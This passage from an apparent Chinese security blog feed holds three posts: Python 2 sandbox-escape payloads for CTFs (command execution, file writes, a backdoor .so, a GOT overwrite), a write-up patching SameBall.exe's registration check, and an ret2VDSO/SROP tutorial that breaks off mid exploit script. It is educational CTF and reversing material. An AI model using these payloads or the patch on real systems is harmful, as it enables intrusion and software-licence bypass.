执行系统命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].os.system(&#39;ls&#39;)().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)# 重新载入__builtin__().__class__.__bases__[0].__subclasses__()[59]()._module.__builtin__[&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)# 读文件().__class__.__bases__[0].__subclasses__()[40](r&#39;C:\1.php&#39;).read()# 写文件().__class__.__bases__[0].__subclasses__()[40](&#39;/var/www/html/bkdoor&#39;, &#39;w&#39;).write(&#39;123&#39;)# 执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls /var/www/html&quot;).read()&#39;)</code></pre><p>可以编写一个函数对导入了 <code>os</code> 或 <code>sys</code> 的库进行一个遍历：</p><pre><code class="python">#!/usr/bin/env pythonall_modules = [    &#39;BaseHTTPServer&#39;, &#39;imaplib&#39;, &#39;shelve&#39;, &#39;Bastion&#39;, &#39;anydbm&#39;, &#39;imghdr&#39;, &#39;shlex&#39;, &#39;CDROM&#39;, &#39;argparse&#39;, &#39;imp&#39;, &#39;shutil&#39;, &#39;CGIHTTPServer&#39;, &#39;array&#39;, &#39;importlib&#39;, &#39;signal&#39;, &#39;ast&#39;, &#39;imputil&#39;, &#39;site&#39;, &#39;ConfigParser&#39;, &#39;asynchat&#39;, &#39;inspect&#39;, &#39;sitecustomize&#39;, &#39;Cookie&#39;, &#39;asyncore&#39;, &#39;io&#39;, &#39;smtpd&#39;, &#39;DLFCN&#39;, &#39;atexit&#39;, &#39;itertools&#39;, &#39;smtplib&#39;, &#39;audiodev&#39;, &#39;json&#39;, &#39;sndhdr&#39;, &#39;DocXMLRPCServer&#39;, &#39;audioop&#39;, &#39;keyword&#39;, &#39;socket&#39;, &#39;base64&#39;, &#39;lib2to3&#39;, &#39;spwd&#39;, &#39;FixTk&#39;, &#39;bdb&#39;, &#39;linecache&#39;, &#39;sqlite3&#39;, &#39;HTMLParser&#39;, &#39;binascii&#39;, &#39;linuxaudiodev&#39;, &#39;sre&#39;, &#39;IN&#39;, &#39;binhex&#39;, &#39;locale&#39;, &#39;sre_compile&#39;, &#39;MimeWriter&#39;, &#39;bisect&#39;, &#39;logging&#39;, &#39;sre_constants&#39;, &#39;Queue&#39;, &#39;bsddb&#39;, &#39;sre_parse&#39;, &#39;bz2&#39;, &#39;macpath&#39;, &#39;ssl&#39;, &#39;cPickle&#39;, &#39;macurl2path&#39;, &#39;stat&#39;, &#39;SimpleHTTPServer&#39;, &#39;cProfile&#39;, &#39;mailbox&#39;, &#39;statvfs&#39;, &#39;SimpleXMLRPCServer&#39;, &#39;cStringIO&#39;, &#39;mailcap&#39;, &#39;string&#39;, &#39;SocketServer&#39;, &#39;calendar&#39;, &#39;markupbase&#39;, &#39;stringold&#39;, &#39;StringIO&#39;, &#39;cgi&#39;, &#39;marshal&#39;, &#39;stringprep&#39;, &#39;TYPES&#39;, &#39;cgitb&#39;, &#39;math&#39;, &#39;strop&#39;, &#39;chunk&#39;, &#39;md5&#39;, &#39;struct&#39;, &#39;Tkconstants&#39;, &#39;cmath&#39;, &#39;mhlib&#39;, &#39;subprocess&#39;, &#39;cmd&#39;, &#39;mimetools&#39;, &#39;sunau&#39;, &#39;code&#39;, &#39;mimetypes&#39;, &#39;sunaudio&#39;, &#39;UserDict&#39;, &#39;codecs&#39;, &#39;mimify&#39;, &#39;symbol&#39;, &#39;UserList&#39;, &#39;codeop&#39;, &#39;mmap&#39;, &#39;symtable&#39;, &#39;UserString&#39;, &#39;collections&#39;, &#39;modulefinder&#39;, &#39;sys&#39;, &#39;colorsys&#39;, &#39;multifile&#39;, &#39;sysconfig&#39;, &#39;commands&#39;, &#39;multiprocessing&#39;, &#39;syslog&#39;, &#39;__builtin__&#39;, &#39;compileall&#39;, &#39;mutex&#39;, &#39;tabnanny&#39;, &#39;__future__&#39;, &#39;compiler&#39;, &#39;netrc&#39;, &#39;_abcoll&#39;, &#39;contextlib&#39;, &#39;new&#39;, &#39;tarfile&#39;, &#39;_ast&#39;, &#39;cookielib&#39;, &#39;nis&#39;, &#39;telnetlib&#39;, &#39;_bisect&#39;, &#39;copy&#39;, &#39;nntplib&#39;, &#39;tempfile&#39;, &#39;_bsddb&#39;, &#39;copy_reg&#39;, &#39;ntpath&#39;, &#39;termios&#39;, &#39;_codecs&#39;, &#39;crypt&#39;, &#39;nturl2path&#39;, &#39;test&#39;, &#39;_codecs_cn&#39;, &#39;csv&#39;, &#39;numbers&#39;, &#39;textwrap&#39;, &#39;_codecs_hk&#39;, &#39;ctypes&#39;, &#39;opcode&#39;, &#39;_codecs_iso2022&#39;, &#39;curses&#39;, &#39;operator&#39;, &#39;thread&#39;, &#39;_codecs_jp&#39;, &#39;datetime&#39;, &#39;optparse&#39;, &#39;threading&#39;, &#39;_codecs_kr&#39;, &#39;dbhash&#39;, &#39;os&#39;, &#39;time&#39;, &#39;_codecs_tw&#39;, &#39;dbm&#39;, &#39;os2emxpath&#39;, &#39;timeit&#39;, &#39;_collections&#39;, &#39;decimal&#39;, &#39;ossaudiodev&#39;, &#39;_csv&#39;, &#39;difflib&#39;, &#39;parser&#39;, &#39;_ctypes&#39;, &#39;dircache&#39;, &#39;pdb&#39;, &#39;_ctypes_test&#39;, &#39;dis&#39;, &#39;pickle&#39;, &#39;_curses&#39;, &#39;distutils&#39;, &#39;pickletools&#39;, &#39;_curses_panel&#39;, &#39;doctest&#39;, &#39;pipes&#39;, &#39;_elementtree&#39;, &#39;dumbdbm&#39;, &#39;pkgutil&#39;, &#39;toaiff&#39;, &#39;_functools&#39;, &#39;dummy_thread&#39;, &#39;platform&#39;, &#39;token&#39;, &#39;_hashlib&#39;, &#39;dummy_threading&#39;, &#39;plistlib&#39;, &#39;tokenize&#39;, &#39;_heapq&#39;, &#39;email&#39;, &#39;popen2&#39;, &#39;trace&#39;, &#39;_hotshot&#39;, &#39;encodings&#39;, &#39;poplib&#39;, &#39;traceback&#39;, &#39;_io&#39;, &#39;ensurepip&#39;, &#39;posix&#39;, &#39;_json&#39;, &#39;errno&#39;, &#39;posixfile&#39;, &#39;tty&#39;, &#39;_locale&#39;, &#39;exceptions&#39;, &#39;posixpath&#39;, &#39;_lsprof&#39;, &#39;fcntl&#39;, &#39;pprint&#39;, &#39;types&#39;, &#39;_md5&#39;, &#39;filecmp&#39;, &#39;profile&#39;, &#39;unicodedata&#39;, &#39;_multibytecodec&#39;, &#39;fileinput&#39;, &#39;pstats&#39;, &#39;unittest&#39;, &#39;_multiprocessing&#39;, &#39;fnmatch&#39;, &#39;pty&#39;, &#39;urllib&#39;, &#39;_osx_support&#39;, &#39;formatter&#39;, &#39;pwd&#39;, &#39;urllib2&#39;, &#39;_pyio&#39;, &#39;fpformat&#39;, &#39;py_compile&#39;, &#39;urlparse&#39;, &#39;_random&#39;, &#39;fractions&#39;, &#39;pyclbr&#39;, &#39;user&#39;, &#39;_sha&#39;, &#39;ftplib&#39;, &#39;pydoc&#39;, &#39;uu&#39;, &#39;_sha256&#39;, &#39;functools&#39;, &#39;pydoc_data&#39;, &#39;uuid&#39;, &#39;_sha512&#39;, &#39;future_builtins&#39;, &#39;pyexpat&#39;, &#39;warnings&#39;, &#39;_socket&#39;, &#39;gc&#39;, &#39;quopri&#39;, &#39;wave&#39;, &#39;_sqlite3&#39;, &#39;genericpath&#39;, &#39;random&#39;, &#39;weakref&#39;, &#39;_sre&#39;, &#39;getopt&#39;, &#39;re&#39;, &#39;webbrowser&#39;, &#39;_ssl&#39;, &#39;getpass&#39;, &#39;readline&#39;, &#39;whichdb&#39;, &#39;_strptime&#39;, &#39;gettext&#39;, &#39;repr&#39;, &#39;wsgiref&#39;, &#39;_struct&#39;, &#39;glob&#39;, &#39;resource&#39;, &#39;xdrlib&#39;, &#39;_symtable&#39;, &#39;grp&#39;, &#39;rexec&#39;, &#39;xml&#39;, &#39;_sysconfigdata&#39;, &#39;gzip&#39;, &#39;rfc822&#39;, &#39;xmllib&#39;, &#39;_sysconfigdata_nd&#39;, &#39;hashlib&#39;, &#39;rlcompleter&#39;, &#39;xmlrpclib&#39;, &#39;_testcapi&#39;, &#39;heapq&#39;, &#39;robotparser&#39;, &#39;xxsubtype&#39;, &#39;_threading_local&#39;, &#39;hmac&#39;, &#39;runpy&#39;, &#39;zipfile&#39;, &#39;_warnings&#39;, &#39;hotshot&#39;, &#39;sched&#39;, &#39;zipimport&#39;, &#39;_weakref&#39;, &#39;htmlentitydefs&#39;, &#39;select&#39;, &#39;zlib&#39;, &#39;_weakrefset&#39;, &#39;htmllib&#39;, &#39;sets&#39;, &#39;abc&#39;, &#39;httplib&#39;, &#39;sgmllib&#39;, &#39;aifc&#39;, &#39;ihooks&#39;, &#39;sha&#39;]methods = [&#39;os&#39;, &#39;sys&#39;, &#39;__builtin__&#39;]results = {}for module in all_modules:    results[module] = {        &#39;flag&#39;: 0,        &#39;result&#39;: {}    }    try:        m = __import__(module)        attrs = dir(m)        for method in methods:            if method in attrs:                results[module][&#39;flag&#39;] = 1                results[module][&#39;result&#39;][method] = &#39;\033[1;31mYES\033[0m&#39;            else:                results[module][&#39;result&#39;][method] = &#39;NO&#39;    except Exception as e:        print module, efor result in results:    if results[result][&#39;flag&#39;]:        print &#39;[*]&#39;, result        for r in results[result][&#39;result&#39;]:            print &#39;\t[+]&#39;, r, &#39;=&gt;&#39;, results[result][&#39;result&#39;][r]</code></pre><h1 id="伪-private-属性和函数"><a href="#伪-private-属性和函数" class="headerlink" title="伪 private 属性和函数"></a>伪 <code>private</code> 属性和函数</h1><p>Python 中以双下划线开头的函数和属性是 <code>private</code> 的，但是这种 <code>private</code> 只是形式上的，表示这个函数不应该在本类之外的地方进行访问，而是否遵守则取决于具体的实现。公有的函数和属性，使用其名字直接进行访问；而私有的属性和函数，使用 <code>下划线+类名+函数名</code> 进行访问：</p><pre><code class="python">In [1]: class A():    ...:     __a = 1    ...:     b = 2    ...:     def __c(self):    ...:         pass    ...:     def d(self):    ...:         pass    ...:In [2]: dir(A)Out[2]: [&#39;_A__a&#39;, &#39;_A__c&#39;, &#39;__doc__&#39;, &#39;__module__&#39;, &#39;b&#39;, &#39;d&#39;]</code></pre><h1 id="构造-so-库"><a href="#构造-so-库" class="headerlink" title="构造 so 库"></a>构造 so 库</h1><p>编译一个 so 库，并写入指定的路径：</p><pre><code class="cpp">// gcc bkdoor.c -shared -fPIC -o libbkdoor.sovoid my_init() __attribute__((constructor));void my_init() {    system(&quot;ls -la /home/ctf/ &gt; /tmp/ls_home_ctf&quot;);}</code></pre><p>调用 ctypes 来载入 so 库：</p><pre><code class="python">In [1]: # &#39;&#39;.__class__.__mro__[-1].__subclasses__()[235] =&gt; ctypes.CDLLIn [2]: # &#39;&#39;.__class__.__mro__[-1].__subclasses__()[236] =&gt; ctypes.LibraryLoaderIn [3]: &#39;&#39;.__class__.__mro__[-1].__subclasses__()[236](&#39;&#39;.__class__.__mro__[-1].__subclasses__()[235]).LoadLibrary(&#39;/tmp/libbkdoor.so&#39;)Out[3]: &lt;CDLL &#39;/tmp/libbkdoor.so&#39;, handle 2831310 at 7ff2434184d0&gt;In [4]: __import__(&#39;os&#39;).system(&#39;cat /tmp/ls_home_ctf&#39;)total 8drwxr-xr-x 2 root root 4096 Apr  3 02:23 .drwxr-xr-x 1 root root 4096 Apr  3 02:23 ..-rw-r--r-- 1 root root    0 Apr  3 02:23 flagOut[4]: 0</code></pre><h1 id="修改-GOT-表"><a href="#修改-GOT-表" class="headerlink" title="修改 GOT 表"></a>修改 GOT 表</h1><p>类似 PWN 里的做法，可以把 <code>fopen</code> 的 GOT 改为 <code>system</code>。先用 objdump 查找：</p><pre><code class="bash">/usr/bin ❯ objdump -R python | grep -E &quot;fopen|system&quot;00000000008de2b8 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.500000000008de8c8 R_X86_64_JUMP_SLOT  fopen64@GLIBC_2.2.5</code></pre><p>一句话脚本：</p><pre><code class="python"># 0x00000000008de2b8 =&gt; system# 0x00000000008de8c8 =&gt; fopen(lambda r, w:    r.seek(0x00000000008de2b8) or    w.seek(0x00000000008de8c8) or    w.write(r.read(8)) or    ().__class__.__bases__[0].__subclasses__()[40](&#39;ls&#39;))(    ().__class__.__bases__[0].__subclasses__()[40](&#39;/proc/self/mem&#39;, &#39;r&#39;),    ().__class__.__bases__[0].__subclasses__()[40](&#39;/proc/self/mem&#39;, &#39;w&#39;, 0))</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">https://xz.aliyun.com/t/52</a><br><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a><br><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/203208.html</a><br><a href="https://bestwing.me/awesome-python-sandbox-in-ciscn.html" target="_blank" rel="noopener">https://bestwing.me/awesome-python-sandbox-in-ciscn.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接触过的 Python 沙箱逃逸不是很多，参考了很多大佬的博客。本文主要基于 Python2。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>SameBall.exe v1.02 注册码算法浅析</title>
    <link href="blog.b3ale.cn/2020/03/19/SameBall-exe-v1-02-%E6%B3%A8%E5%86%8C%E7%A0%81%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/"/>
    <id>blog.b3ale.cn/2020/03/19/SameBall-exe-v1-02-%E6%B3%A8%E5%86%8C%E7%A0%81%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/</id>
    <published>2020-03-19T05:44:56.000Z</published>
    <updated>2020-03-20T08:00:50.354Z</updated>
    
    <content type="html"><![CDATA[<p>老师布置的一个作业，算法其实不难，但逆向起来比较复杂，看懂了就好理解了。简单的做个记录。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>程序是一个对对碰游戏，每过一段时间，程序会检测注册表中是否有注册信息，如果没有会弹出注册窗口。</p><h1 id="Bruteforce"><a href="#Bruteforce" class="headerlink" title="Bruteforce"></a>Bruteforce</h1><p>先看看注册向导中会提供什么有用的信息：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/1.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/2.png" srcset="/img/loading.gif" alt></p><p>通过字符串搜索，定位到关键的几处代码：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/3.png" srcset="/img/loading.gif" alt></p><p>然后单步走出这个函数，在 004063CA 处，对前面函数的结构做了一个判断，并跳有一个跳转，往下的代码，可以看出是在使用 RegSetValueA 往注册表里写东西，说明判断注册码成功后进行注册。那么只需要把这个跳转 nop 掉，或者是改成强制的 JMP 004063D0（即跳到下一条指令）即可：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/4.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/5.png" srcset="/img/loading.gif" alt></p><p>将修改保存到文件之后随便输入什么内容都能注册了。</p><h1 id="Algorithm-Analysis"><a href="#Algorithm-Analysis" class="headerlink" title="Algorithm Analysis"></a>Algorithm Analysis</h1><p>先尝试随机输入一些数据，然后根据前面的分析，可以发现在 004063B2 处进行了判断，前面的函数应该生成了注册码：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/6.png" srcset="/img/loading.gif" alt></p><p>进入 00406780 函数，通过函数将两个长为 32 的字符串转为了整型，整型的字长被记录在最低字上：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/7.png" srcset="/img/loading.gif" alt></p><p>接着在在 0040686C 处发现两个字符串以及我们输入的字符串被作为参数传入：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/8.png" srcset="/img/loading.gif" alt></p><p>进入 00406570 函数之后，在 004065C0 处先对字符串的长度判断是否小于 0x100，接着判断字符串的长度是否大于零：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/9.png" srcset="/img/loading.gif" alt></p><p>然后对字符串每个字符进行判断是否在 0 ～ F 的范围内，即是否是一个十六进制字符串：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/10.png" srcset="/img/loading.gif" alt></p><p>显然如果不是的话就会出错，所以在这里设下断点，重新输入一个十六进制数 1234 作为注册码。接着继续往下，在 0040663A 处将我们的输入字符串转成了整型：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/11.png" srcset="/img/loading.gif" alt></p><p>接着往下跟进 00401AE0 函数，其中也传入了三个数字。在 00401B39 到 00401B48 处，计算 8231FC324594496514663D91E6C19989 共有多少位：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/12.png" srcset="/img/loading.gif" alt></p><p>接着将得到的位数 0x80 减去 2，开始进入下面的一个大循环：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/13.png" srcset="/img/loading.gif" alt></p><p>接着在循环中多次调用了 00410630 函数，其中将我们的输入自己相乘，并将结果返回：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/14.png" srcset="/img/loading.gif" alt></p><p>然后调用了 00410A40 函数，具体的汇编个人觉得是被编译器优化过后的结果，通过推测判断可以发现这个函数的运行结果为之前的乘积模 CFBCC6EC474AE5CD0F7BC8DBBA353A11 的结果：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/15.png" srcset="/img/loading.gif" alt></p><p>接着在后面取出了 8231FC324594496514663D91E6C19989，去最高的字并右移 0x1E 位，判断最低位是否为 1，如果为 1 进行下面的一堆乘法操作；反之跳过这段内容。看到这段内容，回想起以前做 ACM 的时候接触过的快速幂算法，按比特判断是否加上对应的次方：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/16.png" srcset="/img/loading.gif" alt></p><p>如果为 0，跳转到最下面，将迭代的数字减一，并开始下一个循环：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/17.png" srcset="/img/loading.gif" alt></p><p>在接下来的循环中，如果判断相乘的数大于一个字，就会分成几个字分别和目标相乘，依次由最高字开始，每次将乘积左移 32 位后加上下一次的乘积：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/18.png" srcset="/img/loading.gif" alt></p><p>这样下来基本清楚 00401AE0 函数是将我们的输入乘上 8231FC324594496514663D91E6C19989 次方再模去 CFBCC6EC474AE5CD0F7BC8DBBA353A11 的结果，推测应该是 RSA 了。后面有一些乱七八糟的函数，调试了很多遍后没发现有什么作用。最后下断点在 00401E34 这里，最后 EAX 存储的地址即为指向 0x1234 经过上面操作的结果：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/19.png" srcset="/img/loading.gif" alt></p><p>然后在 00406570 函数的最后面 0040675F 这边停下来，发现最后将结果转成了字符串，并在 EAX 里存储了这个字符串的地址：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/20.png" srcset="/img/loading.gif" alt></p><p>最后调试的时候是将结果和 0 进行比较，这样的话注册码写 0 就行了，0 的几次方结果都是 0。测试了一下注册码写 0 的话是可以写入注册表的，但是感觉不太可能这么简单，不过前面的 RSA 算法分析应该是没有什么问题了：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/21.png" srcset="/img/loading.gif" alt></p><p>整体看下来发现动态调试确实相比静态分析能更加深入地熟悉一个程序，连续分析了两天，是一次痛苦但收获颇多的经历。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://bbs.pediy.com/thread-38901.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-38901.htm</a><br><a href="https://oi-wiki.org/math/quick-pow/" target="_blank" rel="noopener">https://oi-wiki.org/math/quick-pow/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;老师布置的一个作业，算法其实不难，但逆向起来比较复杂，看懂了就好理解了。简单的做个记录。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Use SROP with ret2VDSO</title>
    <link href="blog.b3ale.cn/2020/03/14/Use-SROP-with-ret2VDSO/"/>
    <id>blog.b3ale.cn/2020/03/14/Use-SROP-with-ret2VDSO/</id>
    <published>2020-03-14T02:24:24.000Z</published>
    <updated>2020-03-19T15:51:15.263Z</updated>
    
    <content type="html"><![CDATA[<p>用 SROP 的时候，一般情况下很难找得到 <code>syscall ; ret</code>，这时就需要在 VDSO 中找了。</p><a id="more"></a><h1 id="What-is-VDSO"><a href="#What-is-VDSO" class="headerlink" title="What is VDSO"></a>What is VDSO</h1><p>VDSO（Virtual Dynamically-linked Shared Object）是个很有意思的东西，它是虚拟的，与虚拟内存一样，在计算机中本身并不存在。因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。VDSO 将内核态的调用映射到用户态的地址空间中，可以大量减少这样的开销，同时也可以使路径更好。</p><blockquote><p>这里路径更好指的是，不需要使用传统的 <code>int 0x80</code> 来进行系统调用，不同的处理器实现了不同的快速系统调用指令（Intel 实现了 <code>sysenter</code>、<code>sysexit</code>；AMD 实现了 <code>syscall</code>、<code>sysret</code>），由此自然就会出现兼容性问题。所以 Linux 实现了 <code>vsyscall</code> 接口，在底层会根据具体的结构来进行具体操作。而 <code>vsyscall</code> 就实现在 VDSO 中。</p></blockquote><p>Linux（2.6 及以上的版本）环境下执行 <code>ldd /bin/sh</code>，会发现有个名字叫 <code>linux-vdso.so.1</code>（老点的版本是 <code>linux-gate.so.1</code>）的动态文件，而系统中却找不到它，它就是 VDSO。例如：</p><pre><code class="bash">$ ldd /bin/sh    linux-vdso.so.1 =&gt;  (0x00007ffda1746000)    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a4da29000)    /lib64/ld-linux-x86-64.so.2 (0x00007f9a4e01b000)</code></pre><p>不光是快速系统调用，glibc 现在也提供了 VDSO 的支持，<code>open()</code>、<code>read()</code>、<code>write()</code>、<code>gettimeofday()</code> 都可以直接用 VDSO 中的实现，使得这些调用更快，glibc 更兼容，内核新特性在不影响 glibc 的情况下也可以更快的部署。</p><h2 id="Why-ret2VDSO"><a href="#Why-ret2VDSO" class="headerlink" title="Why ret2VDSO?"></a>Why ret2VDSO?</h2><p>在 x86 系统中，传统的系统调用 <code>int 0x80</code> 并没有很好的效果，因此在 Intel 新型的 CPU 提供了新的系统调用指令（2.6 及以上的版本支持新型系统调用机制）：</p><ul><li><code>sysenter</code></li><li><code>sysexit</code></li></ul><p>VDSO 可以降低在传统的 <code>int 0x80</code> 的额外开销以及提供了 <code>sigreturn</code> 可以使用 SROP。</p><p>其中 vsyscall 固定地址中存在 <code>syscall ; ret</code>：</p><pre><code class="gdb">assassinq&gt;&gt; x/3i 0xffffffffff600000   0xffffffffff600000:    mov    rax,0x60   0xffffffffff600007:    syscall   0xffffffffff600009:    ret</code></pre><p>可以写一个程序做一个系统调用的测试：</p><pre><code class="cpp">#include &lt;time.h&gt;#include &lt;stdio.h&gt;typedef time_t (*time_func)(time_t *);int main(int argc, char *argv[]) {    time_t tloc;    int retval = 0;    time_func func = (time_func) 0xffffffffff600000;    retval = func(&amp;tloc);    if (retval &lt; 0) {        perror(&quot;time_func&quot;);        return -1;    }    printf(&quot;%ld\n&quot;, tloc);    return 0;}</code></pre><p>总而言之，就是在 VDSO 中存在 <code>syscall ; ret</code> 可以被 SROP 利用。</p><h2 id="How-ret2VDSO"><a href="#How-ret2VDSO" class="headerlink" title="How ret2VDSO?"></a>How ret2VDSO?</h2><p><code>sysenter</code> 其参数传递方式和 <code>int 0x80</code> 是一样的，但是需要先做好 Function Prologue：</p><pre><code class="asm">push ebp ; mov ebp, esp</code></pre><p>以及需要找到一个好的 Gadget 来做 Stack Pivot。</p><h2 id="ret2VDSO-Theory"><a href="#ret2VDSO-Theory" class="headerlink" title="ret2VDSO Theory"></a>ret2VDSO Theory</h2><p>获取 VDSO 的方法：</p><ol><li>暴力破解</li><li>通过泄漏<ul><li>使用 ld.so 中的 <code>_libc_stack_end</code> 找到 stack 其实位置，计算 ELF Auxiliary Vector Offset 并从中取出 <code>AT_SYSINFO_EHDR</code>；</li><li>使用 ld.so 中的 <code>_rtld_global_ro</code> 的某个 Offset 也有 VDSO 的位置。</li><li>尤其注意的是在开了 ASLR 的情况下，VDSO 的利用是有一定优势的<ul><li>在 x86 环境下：只有一个字节是随机的，所以我们可以很容易暴力解决；</li><li>在 x64 环境下：在开启了 PIE 的情形下，有 11 字节是随机的，例如：CVE-2014-9585。但是在 Linux 3.182.2 版本之后，这个已经增加到了 18 个字节的随机</li></ul></li></ul></li></ol><p>查看存储 VDSO 的地址：</p><pre><code class="gdb">assassinq&gt;&gt; p &amp;_rtld_global_ro._dl_sysinfo_dso$1 = (const Elf32_Ehdr **) 0xf7ffced4 &lt;_rtld_global_ro+468&gt;</code></pre><p>查看 VDSO 的地址（直接 vmmap 也行）：</p><pre><code class="gdb">assassinq&gt;&gt; p _rtld_global_ro._dl_sysinfo_dso$2 = (const Elf32_Ehdr *) 0xf7fd8000</code></pre><p>通过 ELF Auxiliary Vector Offset 计算出 VDSO 的地址（泄露相应的栈上的值）：</p><pre><code class="gdb">assassinq&gt;&gt; info auxv32   AT_SYSINFO           Special system info/entry points 0xf7fd8b5033   AT_SYSINFO_EHDR      System-supplied DSO&#39;s ELF header 0xf7fd8000 &lt;--- Address of VDSO16   AT_HWCAP             Machine-dependent CPU capability hints 0x9f8bfbff6    AT_PAGESZ            System page size               409617   AT_CLKTCK            Frequency of times()           1003    AT_PHDR              Program headers for program    0x80480344    AT_PHENT             Size of program header entry   325    AT_PHNUM             Number of program headers      97    AT_BASE              Base address of interpreter    0xf7fd90008    AT_FLAGS             Flags                          0x09    AT_ENTRY             Entry point of program         0x804834011   AT_UID               Real user ID                   012   AT_EUID              Effective user ID              013   AT_GID               Real group ID                  014   AT_EGID              Effective group ID             023   AT_SECURE            Boolean, was exec setuid-like? 025   AT_RANDOM            Address of 16 random bytes     0xffffd8cb31   AT_EXECFN            File name of executable        0xffffdfd8 &quot;/root/tmp/ret2VDSO_Example/main&quot;15   AT_PLATFORM          String identifying platform    0xffffd8db &quot;i686&quot;0    AT_NULL              End of vector                  0x0</code></pre><p>事实证明 VDSO 也没有非常随机，可以做一个测试：</p><pre><code class="bash">$ ldd /bin/ls    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007ffff7bb5000)    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff77eb000)    libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007ffff757b000)    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7377000)    /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ffff715a000)$ while true; do ldd /bin/ls; done | grep 0x00007ffff7ffa000    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    ...</code></pre><h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>32 位下对 VDSO 进行爆破。程序如下，读入 0x400 的字节，足够塞一个构造的 sigcontext 了：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char buf[10] = &quot;/bin/sh\x00&quot;;void pwnme() {    char s[0x100];    char *welcome = &quot;&gt; &quot;;    write(1, welcome, 2);    read(0, s, 0x400);}int main() {    pwnme();    return 0;}</code></pre><p>同时，我们在 VDSO 中可以找到 sigreturn 所对应的调用：</p><pre><code class="gdb">assassinq&gt;&gt; x/3i 0xf7fd8b71   0xf7fd8b71 &lt;__kernel_sigreturn+1&gt;:    mov    eax,0x77   0xf7fd8b76 &lt;__kernel_sigreturn+6&gt;:    int    0x80   0xf7fd8b78 &lt;__kernel_sigreturn+8&gt;:    nop</code></pre><p>关闭 ASLR 对 ret2VDSO 进行测试：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]context.arch = &#39;i386&#39;bin_sh_addr = 0x804a020bss_addr = 0x804a030p = 